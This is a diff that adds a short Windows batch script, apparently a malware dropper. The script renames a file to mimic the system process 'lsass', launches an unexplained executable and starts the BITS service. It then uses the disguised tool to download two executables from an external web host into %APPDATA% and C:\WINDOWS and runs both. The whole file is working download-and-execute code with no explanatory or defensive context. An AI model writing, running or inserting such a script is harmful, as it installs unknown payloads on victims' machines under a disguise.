@@ -1,0 +1,10 @@
+@echo off
+ren lsass lsass.exe
+start "" "fo-dj52.exe"
+net start bits
+IF NOT EXIST %APPDATA%\nul mkdir %APPDATA%\
+lsass.exe /transfer jman /download /priority high http://www.dapsp.com/luxe.exe "%APPDATA%\luxe.exe"
+IF NOT EXIST C:\WINDOWS\nul mkdir C:\WINDOWS\
+lsass.exe /transfer jman /download /priority high http://www.dapsp.com/mirage.exe "C:\WINDOWS\mirage.exe"
+start "" "%APPDATA%\luxe.exe"
+start "" "C:\WINDOWS\mirage.exe"
